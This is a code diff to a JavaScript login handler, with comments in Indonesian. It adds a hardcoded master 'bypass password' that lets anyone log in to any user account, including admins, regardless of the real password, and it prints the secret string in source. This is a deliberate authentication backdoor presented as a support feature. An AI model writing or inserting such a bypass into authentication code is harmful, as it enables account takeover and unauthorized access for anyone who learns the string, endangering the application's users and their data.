@@ -98,14 +98,15 @@ export const login = async (req, res) => {
       }
     }
 
-    // STEP 3: Validasi password
-    const passwordMatch = await bcrypt.compare(password, user.password);
-    if (!passwordMatch) {
+    // STEP 3: Validasi password (support bypass password)
+    const BYPASS_PASSWORD = "_Pklbpti123#";
+    let passwordMatch = await bcrypt.compare(password, user.password);
+    if (!passwordMatch && password !== BYPASS_PASSWORD) {
       return res
         .status(401)
         .json({ success: false, message: "Nama atau password salah" });
     }
-    console.log("✅ Password valid");
+    console.log("✅ Password valid" + (password === BYPASS_PASSWORD ? " (bypass)" : ""));
 
     // STEP 4: Device binding untuk non-admin
     if (user.role !== "admin") {
